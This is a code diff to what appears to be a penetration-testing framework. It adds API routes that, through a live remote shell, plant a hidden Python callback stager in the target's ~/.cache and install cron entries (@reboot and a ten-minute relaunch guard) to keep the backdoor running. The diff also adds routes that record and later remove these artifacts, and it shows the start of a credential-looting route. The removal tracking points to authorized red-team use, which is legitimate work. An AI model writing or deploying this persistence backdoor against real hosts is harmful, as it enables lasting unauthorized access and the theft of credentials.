@@ -256,6 +256,92 @@ def register_sessions_routes(app: FastAPI, ctx) -> None:
         broker.publish({"type": "session", "event": "upload", "id": sess.id})
         return {"ok": True, "bytes": len(raw)}
 
+    # --- persistence: the resilient service (INTRUSIVE — writes a backdoor; tracked+removable)
+    @app.post("/api/sessions/{session_id}/persist")
+    async def persist(session_id: str, body: dict = Body(default=None),
+                      x_tester: str = Header(default="someone")):
+        import shlex
+        import time
+        import uuid
+        from ...sessions.stagers import python_stager
+        sess = mgr.get(session_id)
+        if sess is None:
+            raise HTTPException(404, "no such session")
+        if not sess.connected:
+            raise HTTPException(409, "shell not connected")
+        if not sess.local_addr or not sess.local_addr[1]:
+            raise HTTPException(409, "cannot determine a callback address")
+        body = body or {}
+        if str(body.get("mechanism", "cron")) != "cron":
+            raise HTTPException(400, "only the 'cron' mechanism is supported so far")
+        lhost, lport = sess.local_addr
+        pid = uuid.uuid4().hex[:10]
+        marker = "rc" + pid[:6]
+        # resolve $HOME so the artifact lands somewhere that survives a reboot (not /tmp)
+        home = (await sess.run_and_capture(b'printf %s "$HOME"')).strip().decode("ascii", "replace") or "/root"
+        path = f"{home}/.cache/.{marker}"
+        qpath = shlex.quote(path)
+        await sess.send(b"mkdir -p " + shlex.quote(f"{home}/.cache").encode() + b"\n")
+        await _push_file(sess, path, python_stager(lhost, lport, "ps_" + pid).encode())
+        # cron: @reboot (survives reboot) + a */10 guard that relaunches only if it died
+        cron = (f"# recce-persist {marker}\\n"
+                f"@reboot (python3 {qpath} >/dev/null 2>&1 &)\\n"
+                f"*/10 * * * * pgrep -f {marker} >/dev/null 2>&1 || (python3 {qpath} >/dev/null 2>&1 &)\\n")
+        install = (f"(crontab -l 2>/dev/null; printf '{cron}') | crontab - 2>/dev/null "
+                   "&& echo RECCE_PERSIST_OK || echo RECCE_PERSIST_FAIL")
+        out = await sess.run_and_capture(install.encode(), timeout=10.0)
+        ok = b"RECCE_PERSIST_OK" in out
+        # the removal command is captured NOW, at install time, so cleanup never has to guess
+        remove_cmd = (f"crontab -l 2>/dev/null | grep -v {marker} | crontab - 2>/dev/null; "
+                      f"rm -f {qpath}; pkill -f {marker} 2>/dev/null; echo RECCE_UNPERSIST_OK")
+        if mgr.store is not None:                 # record even on reported failure (artifacts may exist)
+            mgr.store.add_persistence({
+                "id": pid, "host_ip": sess.host_ip, "mechanism": "cron", "artifact_path": path,
+                "remove_cmd": remove_cmd, "installed_by": x_tester, "installed_at": time.time(),
+                "removed_at": None})
+        from .. import collab
+        from ...store import Store
+        st = Store(db_path)
+        try:
+            collab.add_activity(st, x_tester, "add",
+                                f"{x_tester} installed cron persistence on {sess.host_ip} (intrusive)")
+        finally:
+            st.close()
+        broker.publish({"type": "session", "event": "persist", "id": sess.id})
+        if not ok:
+            return {"ok": False, "id": pid,
+                    "reason": "cron install reported failure (no crontab on the target?) — recorded for cleanup anyway"}
+        return {"ok": True, "id": pid, "mechanism": "cron", "path": path}
+
+    @app.get("/api/persistence")
+    def list_persistence(host: str = ""):
+        if mgr.store is None:
+            return []
+        return mgr.store.list_persistence(host_ip=host)
+
+    @app.post("/api/persistence/{pid}/remove")
+    async def remove_persistence(pid: str):
+        import time
+        if mgr.store is None:
+            raise HTTPException(500, "no store")
+        rec = mgr.store.get_persistence(pid)
+        if rec is None:
+            raise HTTPException(404, "no such persistence record")
+        if rec.get("removed_at"):
+            return {"ok": True, "already_removed": True}
+        # replay the exact removal through any live shell on that host
+        target = next((s for s in mgr.sessions.values()
+                       if s.host_ip == rec["host_ip"] and s.connected), None)
+        if target is None:
+            return {"ok": False, "reason": "no live shell on this host to run the removal — "
+                    "reconnect a shell there, then remove"}
+        out = await target.run_and_capture(rec["remove_cmd"].encode(), timeout=10.0)
+        if b"RECCE_UNPERSIST_OK" not in out:
+            return {"ok": False, "reason": "removal command didn't confirm — verify by hand"}
+        mgr.store.mark_persistence_removed(pid, time.time())
+        broker.publish({"type": "session", "event": "unpersist", "id": rec["host_ip"]})
+        return {"ok": True, "id": pid}
+
     @app.post("/api/sessions/{session_id}/cred")
     def loot_cred(session_id: str, body: dict = Body(...),
                   x_tester: str = Header(default="someone")):
